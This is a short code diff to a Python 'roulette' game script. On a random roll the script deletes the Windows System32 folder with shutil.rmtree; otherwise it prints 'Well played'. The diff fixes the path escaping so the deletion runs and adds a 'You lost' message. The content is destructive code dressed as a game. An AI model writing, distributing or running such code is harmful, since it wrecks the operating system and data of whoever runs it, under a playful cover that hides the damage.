@@ -4,7 +4,8 @@ import shutil
 
 def main():
     if random.randint(0, 6) == 1:
-        shutil.rmtree(r"C:\Windows\System32")
+        shutil.rmtree("C:\\Windows\\System32")
+        print("You lost")
     else:
         print("Well played")
 
